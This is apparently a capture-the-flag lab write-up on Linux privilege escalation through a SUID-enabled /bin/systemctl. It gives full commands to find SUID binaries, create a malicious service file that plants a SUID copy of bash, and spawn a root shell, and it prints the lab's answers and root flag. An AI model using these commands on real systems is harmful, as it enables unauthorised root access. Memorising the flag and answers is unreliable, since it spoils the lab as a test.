# Task 5 — Privilege Escalation

## Goal

Now that we have a reverse shell as the user `bill`, we want to **become root** by exploiting **SUID permissions** on binaries.

# What Is SUID?

SUID (Set User ID) allows users to execute a file with the **permissions of the file owner**. If a binary owned by root has the SUID bit set, it can be used (if misconfigured) to escalate privileges.

# Step 1: Find SUID Binaries

Run this command from your reverse shell:
find / -perm -u=s -type f 2>/dev/null

 You'll get a list of binaries with the SUID bit set. Look for unusual ones.

## Suspicious SUID Binary

From the output, the following stands out:
/bin/systemctl

>  `systemctl` is used to control the systemd system and service manager. If it's misconfigured or available to a non-root user with SUID, it can be exploited to run a command **as root**.

| Question                                                             |  Answer         |
| -------------------------------------------------------------------- | ---------------- |
| **On the system, search for all SUID files. Which file stands out?** | `/bin/systemctl` |

## Step 2: Exploit `/bin/systemctl` to Gain Root Access

## Create a Malicious Service File

We’ll create a **fake service** that runs a **reverse shell** or spawns a root shell.

Steps:

1. Create a service file:
echo "[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
[Install]
WantedBy=multi-user.target" > /tmp/root.service

> This service will copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit, so we can later use it to get a root shell.

2. Run systemctl to enable and start the service:
/bin/systemctl link /tmp/root.service
/bin/systemctl enable --now /tmp/root.service

3. Execute the SUID-rooted shell:
/tmp/rootbash -p

You should now be root!

Run:
whoami
# root

# Step 3: Capture the Root Flag
cat /root/root.txt
# a58ff8579f0a9270368d33a9966c7fd5

| Question                         |  Answer                           |
| -------------------------------- | ---------------------------------- |
| **What is the root flag value?** | `a58ff8579f0a9270368d33a9966c7fd5` |

# Summary
This task demonstrates privilege escalation by abusing a misconfigured SUID binary: `/bin/systemctl`.

# Finding SUID Files
find / -perm -u=s -type f 2>/dev/null

 Notable result:
/bin/systemctl

# Exploitation Steps

1. Create a malicious service:
echo "[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
[Install]
WantedBy=multi-user.target" > /tmp/root.service

2. Start it using systemctl:
/bin/systemctl link /tmp/root.service
/bin/systemctl enable --now /tmp/root.service

3. Run the rooted shell:
/tmp/rootbash -p

## 🔐 Flag
cat /root/root.txt
# a58ff8579f0a9270368d33a9966c7fd5
